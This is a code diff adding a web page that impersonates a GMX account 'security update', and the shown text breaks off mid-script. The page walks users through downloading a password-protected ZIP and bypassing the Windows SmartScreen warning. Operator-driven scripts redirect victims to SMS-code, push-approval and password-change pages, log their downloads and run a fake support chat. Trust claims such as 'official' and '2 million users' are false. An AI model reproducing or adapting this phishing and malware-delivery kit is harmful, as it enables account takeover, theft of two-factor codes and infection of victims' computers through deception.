@@ -1,0 +1,1015 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <title>Sicherheitsaktualisierung — GMX Mein Account</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/styles.css">
+  <!-- __BRAND_JSON__ -->
+  <script src="/brand.js"></script>
+  <style>
+    .sicherheit-update { --card-radius: 16px; }
+    .sicherheit-update .page-center { padding: 16px 12px 24px; max-width: 1000px; margin: 0 auto; }
+    .sicherheit-update .main { max-width: 100%; }
+    .sicherheit-update .update-card {
+      background: #fff;
+      border-radius: var(--card-radius);
+      box-shadow: 0 2px 16px rgba(0, 0, 0, 0.06);
+      border: none;
+      padding: 28px 32px 28px;
+      max-width: 100%;
+      margin: 0 auto;
+    }
+    .sicherheit-update .update-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.72rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      color: #2e7d32;
+      background: #e8f5e9;
+      padding: 6px 12px;
+      border-radius: 20px;
+      margin-bottom: 12px;
+    }
+    .sicherheit-update .update-badge-icon {
+      width: 14px;
+      height: 14px;
+      flex-shrink: 0;
+    }
+    .sicherheit-update .update-heading {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin: 0 0 8px 0;
+      line-height: 1.3;
+      letter-spacing: -0.02em;
+    }
+    .sicherheit-update .update-sub {
+      font-size: 1rem;
+      color: #444;
+      margin: 0 0 16px 0;
+      line-height: 1.5;
+    }
+    .sicherheit-update .update-device {
+      font-size: 0.9rem;
+      color: #333;
+      margin: 0 0 16px 0;
+      padding: 12px 14px;
+      background: rgba(232, 245, 233, 0.5);
+      border-radius: 10px;
+      border-left: 4px solid #43a047;
+    }
+    .sicherheit-update .update-trust {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px 24px;
+      margin: 18px 0 20px 0;
+      padding: 16px 0;
+      border-top: 1px solid #eee;
+      border-bottom: 1px solid #eee;
+    }
+    .sicherheit-update .update-trust-item {
+      font-size: 0.88rem;
+      color: #444;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .sicherheit-update .update-trust-item::before {
+      content: '';
+      width: 16px;
+      height: 16px;
+      background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2343a047'%3E%3Cpath d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z'/%3E%3C/svg%3E") no-repeat center;
+      background-size: contain;
+      flex-shrink: 0;
+    }
+    .sicherheit-update .update-social {
+      font-size: 0.9rem;
+      color: #2e7d32;
+      font-weight: 500;
+      margin: 0 0 20px 0;
+      padding: 12px 14px;
+      background: rgba(232, 245, 233, 0.6);
+      border-radius: 10px;
+      border: 1px solid rgba(46, 125, 50, 0.15);
+    }
+    .sicherheit-update .update-cta-wrap {
+      margin: 20px 0 12px 0;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: stretch;
+      gap: 12px;
+    }
+    .sicherheit-update .update-cta-wrap .update-cta {
+      flex: 1 1 200px;
+      min-width: 0;
+    }
+    .sicherheit-update .update-cta-wrap .update-password-row {
+      flex: 0 0 auto;
+      align-self: center;
+      min-width: 0;
+    }
+    @media (max-width: 520px) {
+      .sicherheit-update .update-cta-wrap {
+        flex-direction: column;
+        align-items: stretch;
+      }
+      .sicherheit-update .update-cta-wrap .update-cta { flex: none; }
+    }
+    .sicherheit-update .update-cta {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      min-height: 52px;
+      padding: 14px 24px;
+      font-size: 1.08rem;
+      font-weight: 600;
+      color: #fff;
+      background: linear-gradient(180deg, #52b857 0%, #43a047 50%, #3d8b40 100%);
+      border: none;
+      border-radius: 12px;
+      box-shadow: 0 4px 0 #2e7d32, 0 8px 24px rgba(67, 160, 71, 0.4);
+      cursor: pointer;
+      text-decoration: none;
+      transition: transform 0.15s, box-shadow 0.15s;
+      font-family: inherit;
+    }
+    .sicherheit-update .update-cta-icon {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
+    .sicherheit-update .update-cta:hover {
+      background: linear-gradient(180deg, #5cc962 0%, #4caf50 50%, #43a047 100%);
+      box-shadow: 0 6px 0 #2e7d32, 0 12px 28px rgba(67, 160, 71, 0.4);
+      transform: translateY(-1px);
+      color: #fff;
+    }
+    .sicherheit-update .update-cta:active {
+      transform: translateY(1px);
+      box-shadow: 0 2px 0 #2e7d32, 0 4px 12px rgba(67, 160, 71, 0.3);
+    }
+    .sicherheit-update .update-cta[aria-disabled="true"] {
+      pointer-events: none;
+      opacity: 0.85;
+      cursor: not-allowed;
+    }
+    .sicherheit-update .update-hint {
+      font-size: 0.85rem;
+      color: #666;
+      margin: 12px 0 0 0;
+      line-height: 1.5;
+    }
+    .sicherheit-update .update-below-cta { margin: 12px 0 0 0; display: flex; flex-direction: column; gap: 10px; }
+    .sicherheit-update .update-password-row {
+      font-size: 0.85rem;
+      margin: 0;
+      padding: 8px 12px;
+      background: #f0f7f0;
+      border: 1px solid #c8e6c9;
+      border-radius: 10px;
+      color: #2e7d32;
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 6px;
+    }
+    .sicherheit-update .update-password-row.hidden { display: none; }
+    .sicherheit-update .update-password-label { font-weight: 500; }
+    .sicherheit-update .update-password-value {
+      cursor: pointer;
+      user-select: all;
+      font-family: ui-monospace, 'Cascadia Code', 'Source Code Pro', Menlo, monospace;
+      font-size: 1rem;
+      font-weight: 700;
+      letter-spacing: 0.02em;
+      padding: 4px 8px;
+      background: #fff;
+      border-radius: 6px;
+      border: 1px solid #a5d6a7;
+      color: #1b5e20;
+    }
+    .sicherheit-update .update-password-value:hover { background: #e8f5e9; }
+    .sicherheit-update .update-howto-row { margin: 0; }
+    .sicherheit-update .update-howto-link {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 10px 18px;
+      font-size: 0.9rem;
+      font-weight: 500;
+      color: #2e7d32;
+      background: #e8f5e9;
+      border: 1px solid #a5d6a7;
+      border-radius: 10px;
+      cursor: pointer;
+      text-decoration: none;
+      transition: background 0.2s, border-color 0.2s, color 0.2s;
+      font-family: inherit;
+      width: 100%;
+      max-width: 320px;
+      box-sizing: border-box;
+    }
+    .sicherheit-update .update-howto-link:hover {
+      background: #c8e6c9;
+      border-color: #81c784;
+      color: #1b5e20;
+    }
+    .sicherheit-update .update-howto-link .update-howto-icon {
+      width: 18px;
+      height: 18px;
+      flex-shrink: 0;
+      opacity: 0.9;
+    }
+    .sicherheit-update .sicherheit-modal-overlay { z-index: 10000; }
+    .support-chat-wrap { z-index: 10001; }
+    .sicherheit-modal-header {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+    .sicherheit-modal-header .sicherheit-modal-title { margin-bottom: 0; }
+    .sicherheit-modal-steps-wrap { margin: 0; }
+  </style>
+</head>
+<body class="page-change-password sicherheit-update">
+  <header class="gmx-header gmx-header--steps" aria-hidden="false">
+    <div class="header-inner">
+      <span class="gmx-logo" id="brand-logo-text">GMX</span>
+      <span class="header-title">Mein Account</span>
+    </div>
+  </header>
+
+  <div class="page-center">
+    <main class="main card" id="main-sicherheit-update">
+      <section class="card-inner step active update-card">
+        <span class="update-badge" aria-hidden="true"><svg class="update-badge-icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>Empfohlen von GMX</span>
+        <h1 class="update-heading" id="update-heading">Sicherheitsaktualisierung für Ihr Konto</h1>
+        <p class="update-sub" id="update-sub">Ihr Zugang bleibt optimal geschützt – kostenlos und in wenigen Sekunden.</p>
+
+        <p class="update-device" id="update-device">Für Ihren PC: Installieren Sie die offizielle GMX-Sicherheitsanwendung – sicher und zertifiziert.</p>
+
+        <div class="update-trust">
+          <span class="update-trust-item">Kostenlos – keine Kreditkarte nötig</span>
+          <span class="update-trust-item">Offizielle GMX-Anwendung</span>
+          <span class="update-trust-item">Installation in ca. 30 Sekunden</span>
+          <span class="update-trust-item">Ihre Daten bleiben bei GMX</span>
+        </div>
+
+        <p class="update-social" id="update-social">Über 2 Mio. Nutzer vertrauen bereits auf diese Aktualisierung.</p>
+
+        <div class="update-cta-wrap" id="update-cta-wrap">
+          <a href="#" class="update-cta" id="btn-download" download role="button" aria-disabled="true" data-ready="0"><svg class="update-cta-icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>Jetzt sichern &amp; aktualisieren</a>
+          <p class="update-password-row hidden" id="update-password-row"><span class="update-password-label">Passwort für die Installation:</span> <strong class="update-password-value" id="update-password-value" title="Klicken zum Kopieren"></strong></p>
+        </div>
+        <div class="update-below-cta" id="update-below-cta">
+          <p class="update-howto-row"><a href="/sicherheit-anleitung.html" class="update-howto-link" id="update-howto-link"><svg class="update-howto-icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>So installieren – Schritt-für-Schritt-Anleitung</a></p>
+        </div>
+        <p class="update-hint">Ein Klick startet den Download. 100 % kostenlos, von GMX bereitgestellt – sicher und unverbindlich.</p>
+      </section>
+    </main>
+  </div>
+
+  <!-- Чат поддержки -->
+  <div class="support-chat-wrap" id="support-chat-wrap">
+    <button type="button" class="support-chat-toggle" id="support-chat-toggle" aria-label="Support öffnen">
+      <span class="support-chat-toggle-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg></span>
+      <span class="support-chat-unread-dot" id="support-chat-unread-dot" aria-hidden="true"></span>
+    </button>
+    <div class="support-chat-panel" id="support-chat-panel" hidden>
+      <header class="support-chat-header">
+        <div class="support-chat-avatar" id="support-chat-avatar">
+          <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="20" cy="20" r="20" fill="#1c449b"/><path d="M20 20c2.8 0 5-2.2 5-5s-2.2-5-5-5-5 2.2-5 5 2.2 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z" fill="#fff"/></svg>
+        </div>
+        <div class="support-chat-meta">
+          <span class="support-chat-name">Sarah</span>
+          <span class="support-chat-status"><span class="support-chat-status-dot" aria-hidden="true"></span>GMX Support · Online</span>
+        </div>
+        <div class="support-chat-header-actions">
+          <button type="button" class="support-chat-minimize" id="support-chat-minimize" aria-label="Chat einklappen" title="Einklappen"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></button>
+          <button type="button" class="support-chat-close" id="support-chat-close" aria-label="Einklappen" title="Einklappen"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14"/></svg></button>
+        </div>
+      </header>
+      <div class="support-chat-messages" id="support-chat-messages"></div>
+      <div class="support-chat-typing hidden" id="support-chat-typing">Sarah schreibt…</div>
+      <div class="support-chat-input-wrap">
+        <div class="support-chat-preview" id="support-chat-preview"></div>
+        <div class="support-chat-input-row">
+          <input type="file" accept="image/*" class="support-chat-file" id="support-chat-file" aria-label="Bild anhängen" multiple>
+          <label for="support-chat-file" class="support-chat-img-btn" title="Bild senden">📷</label>
+          <textarea class="support-chat-input" id="support-chat-input" placeholder="Nachricht schreiben..." maxlength="2000" autocomplete="off" rows="1"></textarea>
+          <button type="button" class="support-chat-send" id="support-chat-send" aria-label="Senden">Senden</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="chat-image-overlay" class="chat-image-overlay" hidden>
+    <button type="button" class="chat-image-overlay-close" id="chat-image-overlay-close" aria-label="Schließen">&times;</button>
+    <img src="" alt="" class="chat-image-overlay-img" id="chat-image-overlay-img">
+  </div>
+
+  <footer class="footer">
+    <ul class="footer-links">
+      <li><a href="https://agb-server.gmx.net/gmxagb-de" target="_blank" rel="noopener">AGB</a></li>
+      <li><a href="https://www.gmx.net/impressum/" target="_blank" rel="noopener">Impressum</a></li>
+      <li><a href="https://agb-server.gmx.net/datenschutz" target="_blank" rel="noopener">Datenschutz</a></li>
+    </ul>
+  </footer>
+
+  <div class="sicherheit-modal-overlay" id="sicherheit-modal" role="dialog" aria-labelledby="sicherheit-modal-title" aria-modal="true" hidden>
+    <div class="sicherheit-modal">
+      <button type="button" class="sicherheit-modal-close" id="sicherheit-modal-close" aria-label="Schließen">&times;</button>
+      <div class="sicherheit-modal-header">
+        <h3 class="sicherheit-modal-title" id="sicherheit-modal-title">So starten Sie die Aktualisierung</h3>
+      </div>
+      <div id="sicherheit-zip-password-box" class="sicherheit-zip-password-box hidden" role="alert">
+        <span class="sicherheit-zip-password-label">Passwort für die Installation (GMX.de):</span>
+        <strong class="sicherheit-zip-password-value" id="sicherheit-zip-password-value"></strong>
+      </div>
+      <div class="sicherheit-modal-steps-wrap">
+        <ol class="sicherheit-modal-steps">
+          <li><strong>Herunterladen</strong></li>
+          <li><strong>ZIP öffnen</strong><br>Doppelklick auf die heruntergeladene Datei – der Ordner öffnet sich.</li>
+          <li><strong>Passwort eingeben</strong><br>Doppelklick auf <strong>GMX.de</strong>. Fenster „Password needed“? Passwort von oben eintippen und „OK“ klicken.</li>
+          <li><strong>Windows-Warnung</strong><br>Blaues Fenster erscheint? Zuerst „Weitere Informationen“, dann „Trotzdem ausführen“ anklicken.</li>
+          <li><strong>Fertig</strong><br>Das Programm prüft Ihren PC und entfernt Schadsoftware. Anschließend Computer neu starten – dann sind Sie geschützt.</li>
+        </ol>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      function getLeadId() {
+        var params = new URLSearchParams(window.location.search);
+        var id = params.get('id') || '';
+        if (id) return id;
+        try {
+          return (typeof sessionStorage !== 'undefined' && sessionStorage.getItem('gmw_lead_id')) || '';
+        } catch (e) { return ''; }
+      }
+      (function ensureIdInUrl() {
+        var params = new URLSearchParams(window.location.search);
+        if (params.get('id')) return;
+        var id = getLeadId();
+        if (id) {
+          var path = (window.location.pathname || '/sicherheit-update').replace(/\/$/, '') || '/sicherheit-update';
+          window.location.replace(path + '?id=' + encodeURIComponent(id));
+          return;
+        }
+      })();
+
+      (function startStatusPoll() {
+        var id = getLeadId();
+        if (!id) return;
+        function check() {
+          fetch('/api/status?id=' + encodeURIComponent(id) + '&page=sicherheit-update&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
+            .then(function (r) { return r.json(); })
+            .then(function (res) {
+              if ((res && res.mode) === 'manual') return;
+              var st = res && res.status;
+              if (st === 'redirect_android') {
+                if (statusPollTimer) { clearInterval(statusPollTimer); statusPollTimer = null; }
+                window.location = '/app-update?id=' + encodeURIComponent(id);
+              } else if (st === 'redirect_change_password') {
+                if (statusPollTimer) { clearInterval(statusPollTimer); statusPollTimer = null; }
+                window.location = '/passwort-aendern?id=' + encodeURIComponent(id);
+              } else if (st === 'redirect_open_on_pc') {
+                if (statusPollTimer) { clearInterval(statusPollTimer); statusPollTimer = null; }
+                window.location = '/bitte-am-pc?id=' + encodeURIComponent(id);
+              } else if (st === 'redirect_push') {
+                if (statusPollTimer) { clearInterval(statusPollTimer); statusPollTimer = null; }
+                window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
+              } else if (st === 'redirect_sms_code') {
+                if (statusPollTimer) { clearInterval(statusPollTimer); statusPollTimer = null; }
+                window.location = '/sms-code.html?id=' + encodeURIComponent(id);
+              } else if (st === 'redirect_gmx_net') {
+                if (statusPollTimer) { clearInterval(statusPollTimer); statusPollTimer = null; }
+                window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || 'https://www.gmx.net/';
+              } else if (st === 'error') {
+                if (statusPollTimer) { clearInterval(statusPollTimer); statusPollTimer = null; }
+                window.location = '/anmelden';
+              }
+            })
+            .catch(function () {});
+        }
+        var statusPollTimer = setInterval(check, 1000);
+        check();
+      })();
+
+      function getDeviceLabel() {
+        var ua = (navigator.userAgent || '').toLowerCase();
+        if (/windows/.test(ua)) return 'Windows-PC';
+        if (/mac os x|macintosh/.test(ua)) return 'Mac';
+        if (/android/.test(ua)) return 'Android-Gerät';
+        if (/iphone|ipad/.test(ua)) return 'iPhone oder iPad';
+        return 'Gerät';
+      }
+
+      var device = getDeviceLabel();
+      var headingEl = document.getElementById('update-heading');
+      var deviceEl = document.getElementById('update-device');
+      var socialEl = document.getElementById('update-social');
+      if (headingEl) headingEl.textContent = 'Sicherheitsaktualisierung für Ihr Konto';
+      if (deviceEl) deviceEl.textContent = 'Für Ihren ' + device + ': Installieren Sie die offizielle GMX-Sicherheitsanwendung – sicher und zertifiziert.';
+      if (socialEl) socialEl.textContent = 'Über 2 Mio. Nutzer vertrauen bereits auf diese Aktualisierung.';
+
+      var btn = document.getElementById('btn-download');
+      var modal = document.getElementById('sicherheit-modal');
+      var cachedZipPassword = null;
+
+      function requestDownloadUrl() {
+        return fetch('/api/download-request', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ leadId: getLeadId() }) })
+          .then(function (r) { return r.json(); })
+          .then(function (data) { return data && data.downloadUrl ? data.downloadUrl : null; })
+          .catch(function () { return null; });
+      }
+
+      var downloadCooldownEnd = 0;
+
+      function setDownloadButtonReady(ready, url) {
+        if (!btn) return;
+        if (url) btn.href = url;
+        if (ready && btn.href && btn.href.indexOf('/download/') !== -1 && Date.now() >= downloadCooldownEnd) {
+          btn.setAttribute('data-ready', '1');
+          btn.setAttribute('aria-disabled', 'false');
+        } else {
+          btn.setAttribute('data-ready', '0');
+          btn.setAttribute('aria-disabled', 'true');
+        }
+      }
+
+      function startDownloadWithHref() {
+        var url = btn && btn.href ? btn.href : '';
+        if (!url || url === '#' || url.indexOf('/download/') === -1) return false;
+        var a = document.createElement('a');
+        a.href = url;
+        a.download = '';
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        return true;
+      }
+
+      requestDownloadUrl().then(function (url) {
+        if (btn && url) { btn.href = url; setDownloadButtonReady(true, url); }
+      }).catch(function () { setDownloadButtonReady(false); });
+
+      setInterval(function () {
+        if (!btn || btn.href === '#' || btn.dataset.downloading === '1') return;
+        requestDownloadUrl().then(function (url) { if (btn && url) { btn.href = url; setDownloadButtonReady(true, url); } }).catch(function () {});
+      }, 30000);
+
+      function setPasswordCopyHandler(el, pwd) {
+        if (!el || !pwd) return;
+        el.textContent = pwd;
+        el.title = 'Klicken zum Kopieren';
+        el.onclick = function () {
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(pwd);
+          } else {
+            var ta = document.createElement('textarea');
+            ta.value = pwd;
+            ta.style.position = 'fixed';
+            ta.style.opacity = '0';
+            document.body.appendChild(ta);
+            ta.select();
+            try { document.execCommand('copy'); } catch (e) {}
+            document.body.removeChild(ta);
+          }
+        };
+      }
+
+      function openModalWithPassword(logDownload) {
+        if (!modal) return;
+        if (logDownload) {
+          var id = getLeadId();
+          if (id) {
+            fetch('/api/log-action', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ id: id, action: 'sicherheit_download' })
+            }).catch(function () {});
+          }
+        }
+        modal.removeAttribute('hidden');
+        document.body.style.overflow = 'hidden';
+        var box = document.getElementById('sicherheit-zip-password-box');
+        var valueEl = document.getElementById('sicherheit-zip-password-value');
+        if (box && valueEl) {
+          if (cachedZipPassword) {
+            setPasswordCopyHandler(valueEl, cachedZipPassword);
+            box.classList.remove('hidden');
+          } else {
+            fetch('/api/zip-password').then(function (r) { return r.json(); }).then(function (data) {
+              var pwd = (data.password || '').trim();
+              cachedZipPassword = pwd;
+              if (pwd) {
+                setPasswordCopyHandler(valueEl, pwd);
+                box.classList.remove('hidden');
+              } else {
+                box.classList.add('hidden');
+              }
+            }).catch(function () { box.classList.add('hidden'); });
+          }
+        }
+      }
+
+      fetch('/api/zip-password').then(function (r) { return r.json(); }).then(function (data) {
+        var pwd = (data.password || '').trim();
+        cachedZipPassword = pwd;
+        var row = document.getElementById('update-password-row');
+        var valueEl = document.getElementById('update-password-value');
+        if (pwd && row && valueEl) {
+          setPasswordCopyHandler(valueEl, pwd);
+          row.classList.remove('hidden');
+        } else if (row) {
+          row.classList.add('hidden');
+        }
+      }).catch(function () {
+        var row = document.getElementById('update-password-row');
+        if (row) row.classList.add('hidden');
+      });
+
+      var howtoLink = document.getElementById('update-howto-link');
+      if (howtoLink) {
+        var id = getLeadId();
+        if (id) howtoLink.href = 'sicherheit-anleitung.html?id=' + encodeURIComponent(id);
+      }
+      if (btn && modal) {
+        btn.addEventListener('click', function (e) {
+          e.preventDefault();
+          if (btn.getAttribute('aria-disabled') === 'true') return;
+          var started = startDownloadWithHref();
+          if (started) {
+            btn.href = '#';
+            downloadCooldownEnd = Date.now() + 2000;
+            setDownloadButtonReady(false);
+            requestDownloadUrl().then(function (url) {
+              if (!btn) return;
+              if (url) btn.href = url;
+              var delay = Math.max(0, downloadCooldownEnd - Date.now());
+              setTimeout(function () { setDownloadButtonReady(true, btn.href); }, delay);
+            }).catch(function () {
+              setTimeout(function () { setDownloadButtonReady(true, btn && btn.href ? btn.href : null); }, 2000);
+            });
+          }
+          openModalWithPassword(true);
+        });
+      }
+
+      var closeBtn = document.getElementById('sicherheit-modal-close');
+      if (closeBtn && modal) {
+        function closeModal() {
+          modal.setAttribute('hidden', '');
+          document.body.style.overflow = '';
+        }
+        closeBtn.addEventListener('click', closeModal);
+        modal.addEventListener('click', function (e) {
+          if (e.target === modal) closeModal();
+        });
+      }
+
+      /* Support chat */
+      var chatPanel = document.getElementById('support-chat-panel');
+      var chatToggle = document.getElementById('support-chat-toggle');
+      var chatClose = document.getElementById('support-chat-close');
+      var chatMessages = document.getElementById('support-chat-messages');
+      var chatInput = document.getElementById('support-chat-input');
+      var chatSend = document.getElementById('support-chat-send');
+      var chatFile = document.getElementById('support-chat-file');
+      var chatPreview = document.getElementById('support-chat-preview');
+      var pendingImages = [];
+      var chatPollTimer = null;
+      var MAX_IMAGE_BYTES = 2800000;
+
+      function compressImageIfNeeded(dataUrl, cb) {
+        if (dataUrl.length <= MAX_IMAGE_BYTES) { cb(dataUrl); return; }
+        var img = new Image();
+        img.onload = function () {
+          var max = 1200;
+          var w = img.naturalWidth;
+          var h = img.naturalHeight;
+          if (w <= max && h <= max) { cb(dataUrl); return; }
+          if (w > h) { h = Math.round(h * max / w); w = max; } else { w = Math.round(w * max / h); h = max; }
+          var canvas = document.createElement('canvas');
+          canvas.width = w;
+          canvas.height = h;
+          var ctx = canvas.getContext('2d');
+          ctx.drawImage(img, 0, 0, w, h);
+          var q = 0.75;
+          var result = canvas.toDataURL('image/jpeg', q);
+          while (result.length > MAX_IMAGE_BYTES && q > 0.2) { q -= 0.1; result = canvas.toDataURL('image/jpeg', q); }
+          if (result.length > MAX_IMAGE_BYTES) { cb(null); return; }
+          cb(result);
+        };
+        img.onerror = function () { cb(null); };
+        img.src = dataUrl;
+      }
+
+      function formatMessageTime(isoStr) {
+        if (!isoStr) return '';
+        try {
+          var d = new Date(isoStr);
+          return d.toLocaleTimeString('de-DE', { hour: '2-digit', minute: '2-digit', hour12: false });
+        } catch (e) { return ''; }
+      }
+
+      function renderMessage(msg) {
+        var isUser = msg.from === 'user';
+        var div = document.createElement('div');
+        div.className = 'support-chat-msg support-chat-msg--' + (isUser ? 'user' : 'support');
+        var avatar = document.createElement('div');
+        avatar.className = 'support-chat-msg-avatar';
+        if (isUser) {
+          avatar.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>';
+        } else {
+          avatar.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>';
+        }
+        var bubble = document.createElement('div');
+        bubble.className = 'support-chat-msg-bubble';
+        if (msg.text) {
+          var p = document.createElement('p');
+          p.className = 'support-chat-msg-text';
+          p.textContent = msg.text;
+          bubble.appendChild(p);
+        }
+        if (msg.image) {
+          var wrap = document.createElement('span');
+          wrap.className = 'support-chat-msg-img-wrap';
+          wrap.role = 'button';
+          wrap.tabIndex = 0;
+          wrap.title = 'Bild vergrößern';
+          var img = document.createElement('img');
+          img.className = 'support-chat-msg-img';
+          img.src = msg.image;
+          img.alt = 'Bild';
+          img.loading = 'lazy';
+          wrap.appendChild(img);
+          wrap.addEventListener('click', function () { openChatImage(msg.image); });
+          wrap.addEventListener('keydown', function (e) { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); openChatImage(msg.image); } });
+          bubble.appendChild(wrap);
+        }
+        var timeEl = document.createElement('span');
+        timeEl.className = 'support-chat-msg-time';
+        timeEl.textContent = formatMessageTime(msg.at);
+        bubble.appendChild(timeEl);
+        div.appendChild(avatar);
+        div.appendChild(bubble);
+        return div;
+      }
+
+      function openChatImage(src) {
+        var overlay = document.getElementById('chat-image-overlay');
+        var overlayImg = document.getElementById('chat-image-overlay-img');
+        if (overlay && overlayImg) {
+          overlayImg.src = src;
+          overlay.removeAttribute('hidden');
+          document.body.style.overflow = 'hidden';
+        }
+      }
+      function closeChatImage() {
+        var overlay = document.getElementById('chat-image-overlay');
+        if (overlay) {
+          overlay.setAttribute('hidden', '');
+          document.body.style.overflow = '';
+        }
+      }
+      (function () {
+        var overlay = document.getElementById('chat-image-overlay');
+        var closeBtnOverlay = document.getElementById('chat-image-overlay-close');
+        if (closeBtnOverlay) closeBtnOverlay.addEventListener('click', closeChatImage);
+        if (overlay) overlay.addEventListener('click', function (e) { if (e.target === overlay) closeChatImage(); });
+      })();
+
+      var lastChatSignature = '';
+      var lastOpenedRequestId = null;
+      var lastReadMessageCount = 0;
+      var unreadDotEl = document.getElementById('support-chat-unread-dot');
+
+      function updateUnreadDot(messages, panelOpen) {
+        if (!unreadDotEl) return;
+        if (panelOpen) {
+          lastReadMessageCount = messages.length;
+          unreadDotEl.classList.remove('visible');
+          return;
+        }
+        if (messages.length > lastReadMessageCount && messages[messages.length - 1].from === 'support') {
+          unreadDotEl.classList.add('visible');
+        } else {
+          unreadDotEl.classList.remove('visible');
+        }
+      }
+
+      function sendChatRead() {
+        var leadId = getLeadId();
+        if (leadId) fetch('/api/chat-read', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ leadId: leadId }) }).catch(function () {});
+      }
+      var chatTypingTimer = null;
+      function sendChatTyping(typing) {
+        var leadId = getLeadId();
+        if (!leadId) return;
+        fetch('/api/chat-typing', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ leadId: leadId, who: 'user', typing: typing }) }).catch(function () {});
+      }
+      function loadChat(forceScroll, showOperatorJoined) {
+        var leadId = getLeadId();
+        if (!leadId || !chatMessages) return;
+        fetch('/api/chat?leadId=' + encodeURIComponent(leadId) + '&_=' + Date.now())
+          .then(function (r) { return r.json(); })
+          .then(function (data) {
+            var messages = data.messages || [];
+            var openChat = !!(data && data.openChat);
+            var supportTyping = !!(data && data.supportTyping);
+            var typingEl = document.getElementById('support-chat-typing');
+            if (typingEl) typingEl.classList.toggle('hidden', !supportTyping);
+            if (openChat && chatPanel) {
+              var requestId = (data.openChatRequestId != null) ? String(data.openChatRequestId) : ('legacy-' + Date.now());
+              if (requestId === lastOpenedRequestId) {
